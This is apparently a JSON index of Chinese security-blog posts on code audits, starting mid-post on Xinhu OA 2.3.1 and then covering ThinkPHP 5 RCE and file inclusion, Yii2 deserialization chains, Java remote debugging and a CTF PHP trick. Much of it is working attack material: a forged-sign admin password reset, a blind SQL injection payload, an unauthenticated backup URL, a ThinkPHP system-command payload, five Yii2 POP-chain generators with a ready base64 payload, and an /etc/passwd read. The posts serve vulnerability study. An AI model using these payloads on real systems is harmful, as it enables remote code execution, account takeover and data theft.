在webmain/model/reimplat/reimplat.php中可以看到如下代码，会返回md5值 默认安装完系统这个是空的 返回的也就是空string的md5值，即d41d8cd98f00b204e9800998ecf8427e\n1 2 3 4 5 6 7  public function gethkey() { $key = $this-\u0026gt;reimplat_huitoken; if(isempt($key))$key = $this-\u0026gt;reimplat_secret; if(isempt($key))$key = $this-\u0026gt;reimplat_cnum; return md5($key); }   然后就是$bodystr = $this-\u0026gt;jm-\u0026gt;strunlook($body, $key);，这里对我们传入的数据进行解密 那么我们可以在下面构造一个加密，获取到修改后的sign，如下图所示\n1 2  $test = $this-\u0026gt;jm-\u0026gt;strlook(json_encode(array(\u0026#34;msgtype\u0026#34;=\u0026gt;\u0026#34;editpass\u0026#34;,\u0026#34;user\u0026#34;=\u0026gt;\u0026#34;admin\u0026#34;,\u0026#34;pass\u0026#34;=\u0026gt;\u0026#34;123456\u0026#34;)), $key); echo $test;   发包时还是得用post方法发包，成功拿到恶意修改的sign\n此时我们再把这个sign作为post数据穿进去，经过getpostdata()获取到data，再通过相同的key去通过strunlook()进行解密，从而进入判断条件 修改密码\n1  $msgtype==\u0026#39;editpass\u0026#39;   发包如下\n密码成功修改成了123456\n文件上传处sql盲注 需要先登录后台才能使用文件上传\nwebmain/public/upload/uploadAction.php 在upfileAjax方法里面，找到执行sql语句处，跟进uploadback方法\n这里有一个过滤函数，跟进看一下\n这里注释说明了是过滤特殊的文件名，可以看到，这里过滤的很少\n修改uptype为*，文件名为sql注入语句，可以看到成功延时 盲注语句可以这样写，这里单独的()会被过滤掉，双写就可以了\n1  1\u0026#39; and if(ascii(substr((select database(())),1,1))\u0026gt;1,SLEEP(3),0)-- -   这样就可以写脚本跑内容了，这里就不多说了\n未授权备份 在webmain/task/runt/sysAction.php中 这里用beifenClassModel调用了他的start方法\n找到beifenClassModel，看到里面的start方法 会把数据库数据备份到upload/data目录下，以时间命名\npayload：\n1  /task.php?m=sys|runt\u0026amp;a=beifen   可以发现已经备份过来了\n都是可以直接访问的，可以爆破一下文件名去拿\n这里是可以拿到管理员密码的\n这个的前提是知道数据库的库名，不然还是打不了了，默认是xinhu\n","date":"2021-11-30T19:10:02+08:00","permalink":"https://example.com/post/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","title":"[代码审计]信呼OA2.3.1版本代码审计"},{"content":"前言 漏洞存在版本，分为两大版本：\n  ThinkPHP 5.0-5.0.24\n  ThinkPHP 5.1.0-5.1.30\n  环境搭建 1  composer create-project topthink/think=5.0.5 thinkphp5.0.5 --prefer-dist   修改composer.json\n1 2 3 4  \u0026#34;require\u0026#34;: { \u0026#34;php\u0026#34;: \u0026#34;\u0026gt;=5.4.0\u0026#34;, \u0026#34;topthink/framework\u0026#34;: \u0026#34;5.0.5\u0026#34; },   执行composer update\n漏洞分析 payload:\n1  _method=__construct\u0026amp;method=get\u0026amp;filter[]=system\u0026amp;get[]=whoami   在thinkphp/library/think/Request.php中的method方法里面\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  public function method($method = false) { if (true === $method) { // 获取原始请求类型  return IS_CLI ? \u0026#39;GET\u0026#39; : (isset($this-\u0026gt;server[\u0026#39;REQUEST_METHOD\u0026#39;]) ? $this-\u0026gt;server[\u0026#39;REQUEST_METHOD\u0026#39;] : $_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;]); } elseif (!$this-\u0026gt;method) { if (isset($_POST[Config::get(\u0026#39;var_method\u0026#39;)])) { $this-\u0026gt;method = strtoupper($_POST[Config::get(\u0026#39;var_method\u0026#39;)]); $this-\u0026gt;{$this-\u0026gt;method}($_POST); } elseif (isset($_SERVER[\u0026#39;HTTP_X_HTTP_METHOD_OVERRIDE\u0026#39;])) { $this-\u0026gt;method = strtoupper($_SERVER[\u0026#39;HTTP_X_HTTP_METHOD_OVERRIDE\u0026#39;]); } else { $this-\u0026gt;method = IS_CLI ? \u0026#39;GET\u0026#39; : (isset($this-\u0026gt;server[\u0026#39;REQUEST_METHOD\u0026#39;]) ? $this-\u0026gt;server[\u0026#39;REQUEST_METHOD\u0026#39;] : $_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;]); } } return $this-\u0026gt;method; }   看这里的判断，跟进一下config的get方法\n1 2 3  if (isset($_POST[Config::get(\u0026#39;var_method\u0026#39;)])) { $this-\u0026gt;method = strtoupper($_POST[Config::get(\u0026#39;var_method\u0026#39;)]); $this-\u0026gt;{$this-\u0026gt;method}($_POST);   他执行了Config::get('var_method')，把参数var_method给传进去\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  public static function get($name = null, $range = \u0026#39;\u0026#39;) { $range = $range ?: self::$range; // 无参数时获取所有  if (empty($name) \u0026amp;\u0026amp; isset(self::$config[$range])) { return self::$config[$range]; } if (!strpos($name, \u0026#39;.\u0026#39;)) { $name = strtolower($name); return isset(self::$config[$range][$name]) ? self::$config[$range][$name] : null; } else { // 二维数组设置和获取支持  $name = explode(\u0026#39;.\u0026#39;, $name); $name[0] = strtolower($name[0]); return isset(self::$config[$range][$name[0]][$name[1]]) ? self::$config[$range][$name[0]][$name[1]] : null; } }   返回了一个$config[$range][$name]，即config[_sys_][var_method]，他的值就是_method 所以当我们传入_method=xxx的时候，就可以控制这个$this-\u0026gt;{$this-\u0026gt;method}($_POST);，从而去执行想要执行的函数\n1 2 3  if (isset($_POST[Config::get(\u0026#39;var_method\u0026#39;)])) { $this-\u0026gt;method = strtoupper($_POST[Config::get(\u0026#39;var_method\u0026#39;)]); $this-\u0026gt;{$this-\u0026gt;method}($_POST);   再看这个类的__construct方法\n这个循环会造成一个变量覆盖，而且还是循环的覆盖，可以覆盖很多的值\n 清楚了漏洞存在的根本原因，接下来我们直接从入口开始分析，public/index.php 再跟进start.php 调用了一个App的run方法 再跟进这个方法，这里检测路由会调用routeCheck方法\n1 2 3 4 5 6 7 8  // 获取应用调度信息 $dispatch = self::$dispatch; if (empty($dispatch)) { // 进行URL路由检测  $dispatch = self::routeCheck($request, $config); } // 记录当前调度信息 $request-\u0026gt;dispatch($dispatch);   routeCheck里面调用了Route的check方法 再跟进看到这里调用到了request的method方法 之后就是接上前面分析的request类，传参数_method=__construct进入request类的__construct方法 开始变量的覆盖\n1 2 3  filter[]=system get[]=whoami method=GET   再回到check方法，返回return $this-\u0026gt;method;，由于我们传的参数有一个是method=get，所以变量覆盖后，返回的就是get 如果不做这一步（method=get）返回的就是一些乱七八糟，后续中就可能会出错 再走出去回到app类的run()方法 判断debug，进入分支内，可以看到有一个$request-\u0026gt;param() 这里vars会被赋值成我们post的数据 这里会执行一个array_merge，合并一下url和post中的参数 先进去get方法，因为我们已经通过变量覆盖为get赋值了，所以不会进入判断条件 再进入input方法，第一个参数传的是$this-\u0026gt;get，这个参数是被我们变量覆盖成whoami的 进去后直接就返回了whoami 出来后param变成了这样，param[0]=whoami 再走到input方法，把param传进去，形参是data 这里再进入filterValue方法，参数继续传下去，data和filter 到这里value就是data，即whoami filter就是filters遍历出来的，之前遍历覆盖成了system 这样就成功的执行了system(\u0026ldquo;whoami\u0026rdquo;) 总结 不得不佩服大佬的能力，这个rce分析下来个人感觉还是很复杂的，每一个点都被巧妙的利用起来了，太强了太强了orz\n画一张图总结一下这里的利用链吧\n","date":"2021-11-26T19:07:54+08:00","permalink":"https://example.com/post/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/","title":"[代码审计]ThinkPHP 5.0.x 变量覆盖导致的RCE分析"},{"content":"前言 漏洞存在版本\u0026lt;2.0.38 CVE-2020-15148\n框架搭建 直接去github下载，修改好cookie的key，然后就可以访问/web了\n漏洞分析 先看github里作者的提交\n可以发现在 framework/db/BatchQueryResult.php 里面添加了_wakeup方法 我们就直奔这里去看了\n1  yii2.0.37/vendor/yiisoft/yii2/db/BatchQueryResult.php   看到这里的__distruct()入口方法\n会进去reset方法，但是进去可能就close了，但是这个_dataReader是可以控制的，到时候我们构造poc的时候可以添加析构方法为他赋值！这里$this-\u0026gt;_dataReader就可以触发一个__call方法\n全局搜一下__call方法，发现这个类里面有妙处\n1  /vendor/fzaninotto/faker/src/Faker/Generator.php   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  public function format($formatter, $arguments = array()) { return call_user_func_array($this-\u0026gt;getFormatter($formatter), $arguments); } /** * @param string $formatter * * @return Callable */ public function getFormatter($formatter) { if (isset($this-\u0026gt;formatters[$formatter])) { return $this-\u0026gt;formtters[$formatter]; } foreach ($this-\u0026gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-\u0026gt;formatters[$formatter] = array($provider, $formatter); return $this-\u0026gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf(\u0026#39;Unknown formatter \u0026#34;%s\u0026#34;\u0026#39;, $formatter)); } /** * @param string $method * @param array $attributes * * @return mixed */ public function __call($method, $attributes) { return $this-\u0026gt;format($method, $attributes); }   可以发现，__call进去，就直接进format了，而format里面就会直接执行call_user_func_array，跟进一下他的参数\n先跟进一下getFormatter，发现这里返回的是formatters，这个参数是我们可控的！\n但是另一个$attributes就不可控了，这里是可以执行一些无参数的函数，但是如果只是调用php原生的那肯定做不了什么事情，我们需要调用yii框架里面自带的无参数方法看看有没有能进一步利用的\n继续全局搜索，看看有没有那个无参数方法里面调用了call_user_func 这里是用的正则去搜索，这个正则折腾了好久\n1  function \\w*\\(\\)\\n? *\\{(.*\\n)+ *call_user_func   大概意思就是 function 开头，接着是一段字符接上()后换行，并只匹配0或1次，这里就表示无参数的函数了，但是我们可以更狠一点，直接搜索无参数方法中有call_user_func的，那么就继续加上* \\{匹配前面的表达式0次或多次后加上大括号，然后在call_user_func前面多次匹配上一堆除了换行之外的字符后加上换行：(.*\\n)+ *，最后加上call_user_func\n这样就很精准的匹配到无参数方法中有call_user_func函数的方法了 这里找到了一个，简直不要太好打\n1  /vendor/yiisoft/yii2/rest/CreateAction.php   1 2 3 4 5 6 7 8 9  public function run() { if ($this-\u0026gt;checkAccess) { call_user_func($this-\u0026gt;checkAccess, $this-\u0026gt;id); } 此处省略\t}   checkAccess和id都是我们可控的！那么这条链子就打通了，我们构造一下poc\nPOC1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026lt;?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u0026gt;checkAccess = \u0026#39;system\u0026#39;; $this-\u0026gt;id = \u0026#39;whoami\u0026#39;; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-\u0026gt;formatters[\u0026#34;close\u0026#34;] = [new CreateAction, \u0026#39;run\u0026#39;]; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u0026gt;_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?\u0026gt;  payload:\n1  web?r=test/test\u0026amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6Indob2FtaSI7fWk6MTtzOjM6InJ1biI7fX19fQ==   成功rce\n这条链子的总的攻击思路为\n1 2 3 4  1. BatchQueryResult里面__destruct入口函数调用了reset()函数 2. reset()函数内：$this-\u0026gt;_dataReader-\u0026gt;close();其中_dataReader可控 3. 触发__call方法，找到可利用的call方法：Generator，但是只能执行无参数函数 4. 寻找框架内的可利用的无参数函数，Generator的run   这条链子最后一个寻找无参数可利用函数的时候，还有一个可以利用\nPOC2 1  vendor/yiisoft/yii2/rest/IndexAction.php   1 2 3 4 5 6 7 8  public function run() { if ($this-\u0026gt;checkAccess) { call_user_func($this-\u0026gt;checkAccess, $this-\u0026gt;id); } return $this-\u0026gt;prepareDataProvider(); }   poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026lt;?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u0026gt;checkAccess = \u0026#39;system\u0026#39;; $this-\u0026gt;id = \u0026#39;whoami\u0026#39;; } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u0026gt;formatters[\u0026#34;close\u0026#34;] = [new IndexAction, \u0026#39;run\u0026#39;]; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u0026gt;_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?\u0026gt;  POC3 作者在2.0.38只修复了BatchQueryResult，那么我们能不能再找一个__destruct入口函数去调用call方法，接上后面的链子呢？ 全局搜索__destruct下，找到这个类也可以\n1  /vendor/codeception/codeception/ext/RunProcess.php   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  public function __destruct() { $this-\u0026gt;stopProcess(); } public function stopProcess() { foreach (array_reverse($this-\u0026gt;processes) as $process) { /** @var $process Process **/ if (!$process-\u0026gt;isRunning()) { continue; } $this-\u0026gt;output-\u0026gt;debug(\u0026#39;[RunProcess] Stopping \u0026#39; . $process-\u0026gt;getCommandLine()); $process-\u0026gt;stop(); } $this-\u0026gt;processes = []; }   可以发现，这里调用了$process-\u0026gt;isRunning()，而且这里的process是可控的！那么我们接上上面的链子就可以继续打\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026lt;?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u0026gt;checkAccess = \u0026#39;system\u0026#39;; $this-\u0026gt;id = \u0026#39;whoami\u0026#39;; } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u0026gt;formatters[\u0026#34;isRunning\u0026#34;] = [new IndexAction, \u0026#39;run\u0026#39;]; } } } namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct(){ $this-\u0026gt;processes[] = new Generator; } } } namespace{ echo base64_encode(serialize(new Codeception\\Extension\\RunProcess)); } ?\u0026gt;  POC4 不得不说，师傅们太强了，这里还找到了一个链子 在这个文件里面\n1  /vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  public function clearAll($nsKey) { if (array_key_exists($nsKey, $this-\u0026gt;keys)) { foreach ($this-\u0026gt;keys[$nsKey] as $itemKey =\u0026gt; $null) { $this-\u0026gt;clearKey($nsKey, $itemKey); } if (is_dir($this-\u0026gt;path.\u0026#39;/\u0026#39;.$nsKey)) { rmdir($this-\u0026gt;path.\u0026#39;/\u0026#39;.$nsKey); } unset($this-\u0026gt;keys[$nsKey]); } } public function __destruct() { foreach ($this-\u0026gt;keys as $nsKey =\u0026gt; $null) { $this-\u0026gt;clearAll($nsKey); } }   可以发现，这里进了clearAll后，里面会有一个字符串拼接的操作，而path是我们可控的，那么我们就可以执行__toString方法了，找一下能利用的__toString方法 这里找到了一个这个Cover.php\n1  /vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Covers.php   很明显这里可以调用call方法，直接接上去就可以了\npoc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  \u0026lt;?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u0026gt;checkAccess = \u0026#39;system\u0026#39;; $this-\u0026gt;id = \u0026#39;whoami\u0026#39;; } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u0026gt;formatters[\u0026#34;render\u0026#34;] = [new IndexAction, \u0026#39;run\u0026#39;]; } } } namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class Cover{ public function __construct(){ $this-\u0026gt;description=new Generator; } } } namespace{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\Cover; class Swift_KeyCache_DiskKeyCache{ private $path; private $keys = []; public function __construct(){ $this-\u0026gt;keys=array(\u0026#39;aaa\u0026#39;=\u0026gt;\u0026#39;bbb\u0026#39;); $this-\u0026gt;path=new Cover(); } } echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache)); } ?\u0026gt;  成功rce\n这些也是可以的，很多很多\nPOC5 除了刚刚的__call方法，其实还有一个思路，就是直接去找能利用的close()方法 在这个文件里面找到能利用的点\n1  /vendor/yiisoft/yii2/web/DbSession.php   1 2 3 4 5 6 7 8  public function close() { if ($this-\u0026gt;getIsActive()) { // prepare writeCallback fields before session closes  $this-\u0026gt;fields = $this-\u0026gt;composeFields(); YII_DEBUG ? session_write_close() : @session_write_close(); } }   跟进composeFields方法\n1 2 3 4 5 6 7 8 9 10 11  protected function composeFields($id = null, $data = null) { $fields = $this-\u0026gt;writeCallback ? call_user_func($this-\u0026gt;writeCallback, $this) : []; if ($id !== null) { $fields[\u0026#39;id\u0026#39;] = $id; } if ($data !== null) { $fields[\u0026#39;data\u0026#39;] = $data; } return $fields; }   可以看到这里是有一个call_user_func函数的，而且writeCallback是可控的，那么就可以接上IndexAction的run\npoc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  \u0026lt;?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u0026gt;checkAccess = \u0026#39;system\u0026#39;; $this-\u0026gt;id = \u0026#39;whoami\u0026#39;; } } } namespace yii\\web{ use yii\\rest\\IndexAction; class DbSession { public $writeCallback; public function __construct(){ $a=new IndexAction(); $this-\u0026gt;writeCallback=[$a,\u0026#39;run\u0026#39;]; } } } namespace yii\\db{ use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct(){ $this-\u0026gt;_dataReader=new DbSession(); } } } namespace{ use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult())); }   总结 1 2 3 4 5 6 7 8 9  poc1: BatchQueryResult.__destruct() -\u0026gt; BatchQueryResult.reset() -\u0026gt; Generator.__call() -\u0026gt; Generator.format() -\u0026gt; Generator.getFormatter() -\u0026gt; IndexAction.run() poc2:BatchQueryResult.__destruct() -\u0026gt; BatchQueryResult.reset() -\u0026gt; Generator.__call() -\u0026gt; Generator.format() -\u0026gt; Generator.getFormatter() -\u0026gt; CreateAction.run() poc3: RunProcess.__destruct() -\u0026gt; RunProcess.stopProcess() -\u0026gt; Generator.__call() -\u0026gt; Generator.format() -\u0026gt; Generator.getFormatter() -\u0026gt; CreateAction.run() poc4: Swift_KeyCache_DiskKeyCache.__destruct() -\u0026gt; Swift_KeyCache_DiskKeyCache.clearAll() -\u0026gt; Cover.__toString() -\u0026gt; Cover.render() -\u0026gt; Generator.__call() -\u0026gt; Generator.format() -\u0026gt; Generator.getFormatter() -\u0026gt; CreateAction.run() poc5: BatchQueryResult.__destruct() -\u0026gt; DbSession.close() -\u0026gt; DbSession.composeFields() -\u0026gt; IndexAction.run   大概就分析了这些链，感觉上来说还是不算很难，也是学到了一些代码审计的知识和技巧，那么多条链子，每次成功rce的时候还是很有成就感的\n参考链接：\n https://ego00.blog.csdn.net/article/details/113824239 https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA  ","date":"2021-11-16T19:01:32+08:00","permalink":"https://example.com/post/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38"},{"content":"漏洞影响范围 加载模版解析变量时存在变量覆盖问题，导致文件包含漏洞的产生 漏洞影响版本：5.0.0\u0026lt;=ThinkPHP5\u0026lt;=5.0.18 、5.1.0\u0026lt;=ThinkPHP\u0026lt;=5.1.10\ntp框架搭建 tp框架由两部分组成 应用项目: https://github.com/top-think/think 核心框架: https://github.com/top-think/framework 框架下载好后，需要更名为thinkphp\n这里可以直接用composer来获取代码 通过以下命令获取测试环境代码：\n1  composer create-project --prefer-dist topthink/think=5.0.18 tp5.0.18   将 composer.json 文件的 require 字段设置成如下：\n1 2 3 4  \u0026#34;require\u0026#34;: { \u0026#34;php\u0026#34;: \u0026#34;\u0026gt;=5.6.0\u0026#34;, \u0026#34;topthink/framework\u0026#34;: \u0026#34;5.0.18\u0026#34; },   然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下：\n1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php namespace app\\index\\controller; use think\\Controller; class Index extends Controller { public function index() { $this-\u0026gt;assign(request()-\u0026gt;get()); return $this-\u0026gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html  } }   创建 application/index/view/index/index.html 文件\n漏洞分析 payload：\n1  http://127.0.0.1/tp5.0.18/public/index?cacheFile=php://filter/read=convert.base64-encode/resource=/etc/passwd   打断点进行调试 先进入assign进行模板变量的赋值\n这边会有一个过滤，看起来像sql的过滤，与我们这次的没啥关系\n然后进入fetch方法，走完前面的缓存，就会进入一个read方法\n这里进行了一个变量的赋值：extract($vars, EXTR_OVERWRITE);，但是这里他设置了一个属性：EXTR_OVERWRITE 这个属性的存在，会照成一个变量覆盖的效果\n这时候，cacheFile就会变成我们get提交的数据 下一步就是直接包含了这个文件 输出读取的文件\n成功的包含到了\n漏洞总结 总体来说，漏洞的思路就是：\n 先通过view的assign把get数据存在数组data中  然后进入view的fetch方法，通过$vars = array_merge(self::$var, $this-\u0026gt;data, $vars);，将data中的数据再合并到vars的变量中去  再进入了Think的fetch方法，vars变量被赋进去了  再到template的fetch方法中去，data变量依旧继续传递下去  到template的fetch方法里面，里面有一个cacheFile变量，值为箭头所指的文件，到了read方法，data和cacheFile一起被赋值进去  可以看到，这里的extract函数由于EXTR_OVERWRITE设置了参数，所以cacheFile变量被覆盖了，导致后面的include就包含了我们vars中的值，而这个值我们是可以控制的，这就造成了一个文件包含的漏洞  漏洞的修复 官方漏洞的修复方案 他这里是用了一个$this-\u0026gt;cacheFile 这样一来，在include的时候就不会因为变量覆盖而包含到我们data中的数据了\n1 2 3 4 5 6 7 8 9 10  public function read($cacheFile, $vars = []) { $this-\u0026gt;cacheFile = $cacheFile; if (!empty($vars) \u0026amp;\u0026amp; is_array($vars)) { // 模板阵列变量分解成为独立变量  extract($vars, EXTR_OVERWRITE); } //载入模版缓存文件  include $this-\u0026gt;cacheFile; }   这里学长的文章也是提到了为啥参数不换成EXTR_SKIP防止变量的覆盖呢，EXTR_SKIP的作用就是：如果有冲突，不覆盖已有的变量，那么这一步就会失效，万一你确实是想传这么一个$cacheFile=xxx，那么到这里就会直接实效掉，导致功能的损坏，所以利用$this-\u0026gt;cacheFile是更优的选择\n","date":"2021-11-03T18:57:48+08:00","permalink":"https://example.com/post/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"[代码审计]ThinkPHP5的文件包含漏洞"},{"content":"Jar包的调试 这里以冰蝎做示例 把冰蝎的jar包和他必须的db数据库文件放到项目的lib目录下 把jar包添加到库\n如下配置调试配置 新建远程JVM调试 JVM的命令行参数，根据JDK的版本去选择\n然后比如在这打一个断点\n然后在jar包目录下执行如下命令，后面的参数是刚刚配置调试的那个配置 注意这里，suspend要改成y，不然会卡不住断点，这个参数的意思是：是否等待调试器的接入\n回到idea，debug就可以卡住断点了\nWeblogic的远程调试 这里我们是以dacker来配合Idea进行代码调试，使用的是vulhub项目 示例：CVE-2017-10271 在docker-compose.yml里面加上8453端口，这个端口是用于调试的\ndocker-compose up -d获取镜像并启动后，进入命令行，修改配置文件 在如下路径的setDomainEnv.sh文件中，找到JAVA_DEBUG这里，在下面追加如下代码\n1 2  enbugFlag=\u0026#34;true\u0026#34; export debugFlag   然后执行docker restart xxx命令，重启容器\n下一步我们需要把源代码提取到本地 我们需要/root/Oracle/Middleware/下的modules和wlserver_10.3文件\n使用cp命令的缺点：操作一些长文件名的时候会报错 推荐使用zip压缩后，cp提取出压缩包\n打开idea，将wlserver_10.3/server/lib添加为库\n配置调试器，和上面的jar包一样，端口换成8453就行了\nTomcat的远程调试 以CVE-2017-12615漏洞环境示例 开启5005调试端口，我这里把8080换成了1002，防止端口冲突，本地还是开了挺多服务的\n访问1002端口，成功部署\n在catalina.sh里面插入如下代码 /usr/local/tomcat/bin/catalina.sh\n1  JAVA_OPTS=\u0026#34;-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005\u0026#34;   然后重启docker 注意⚠️ ，这里不能直接拿vscode改，重启会报错找不到catalina.sh文件。。。踩坑找了好久才找到原因 用echo写进去就行，也不知道是为啥，希望有了解过的师傅解答一下\n下一步就是导出docker里面的lib\n1  docker cp 79:/usr/local/tomcat/lib ./   在idea，创建项目，把lib添加为库\n配置调试器还是一样的，端口换成5005\n成功卡住\n","date":"2021-09-18T18:56:41+08:00","permalink":"https://example.com/post/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/","title":"[Java安全] 远程调试初探"},{"content":"最近在一道题目里面学到了一个新的小技巧 在php中，字符串是可以递增的，如下： 但是不可递减\n这道题是这样的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  \u0026lt;?php error_reporting(0); if ($_GET[\u0026#39;looklook\u0026#39;]){ highlight_file(__FILE__); }else{ setcookie(\u0026#34;hint\u0026#34;, \u0026#34;?looklook\u0026#34;, time()+3600); } if (isset($_POST[\u0026#39;ctf_show\u0026#39;])) { $ctfshow = $_POST[\u0026#39;ctf_show\u0026#39;]; if (is_string($ctfshow) || strlen($ctfshow) \u0026lt;= 107) { if (!preg_match(\u0026#34;/[!@#%^\u0026amp;*:\u0026#39;\\\u0026#34;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/\u0026#34;,$ctfshow)){ eval($ctfshow); }else{ echo(\u0026#34;fucccc hacker!!\u0026#34;); } } } else { phpinfo(); } ?\u0026gt;  可以看到，这里长度的限制是107，我们如果拼接一个_GET，如果硬从C开始自增，那可能会超过限制，T理C太远了，所以这里学到了两个新的操作\n在这篇文章有写到（也是原题）\n1 2  $_=C/C ---\u0026gt; NAN $_=1/C ---\u0026gt; INF   但是这不是string类型，但在php里面，我们可以通过拼接一个字符串来让他转成String类型 比如这里我写如下代码\n1 2 3 4 5 6  \u0026lt;?php $a = (C/C.C); $b = (1/C.C); var_dump($a); var_dump($b);   成功得到string类型，这里我们就使用索引就可以单选中字母了\n这样做就可以从N开始递增了，避开了长度的限制\n","date":"2021-08-19T18:53:44+08:00","permalink":"https://example.com/post/%E5%88%A9%E7%94%A8php%E7%9A%84nan%E5%92%8Cinf%E6%9D%A5%E8%8E%B7%E5%8F%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9D%A5%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/","title":"利用PHP的NAN和INF来获取字符串来自增绕过长度限制"}]